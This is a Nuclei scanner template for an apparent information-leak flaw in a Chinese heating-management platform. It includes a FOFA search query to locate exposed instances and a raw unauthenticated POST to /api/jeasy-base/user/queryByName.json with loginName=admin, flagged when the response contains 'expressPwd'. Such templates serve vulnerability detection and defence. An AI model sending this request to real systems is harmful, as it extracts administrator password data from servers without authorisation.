id: zhihuigongre-queryByName-leak
info:
  name: zhihuigongre-queryByName-leak
  author: apple
  severity: high
  reference:
    - https://
  tags: tags
  metadata:
    fofa-query: body="totalPath+jeasy_base+" && body="/user/kickUser.json"

http:
  - raw:
      - |-
        POST /api/jeasy-base/user/queryByName.json HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Content-Length: 15
        Origin: http://{{Hostname}}
        Connection: close
        Referer: http://{{Hostname}}/
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0

        loginName=admin
    matchers:
      - type: word
        part: body
        words:
          - 'expressPwd'
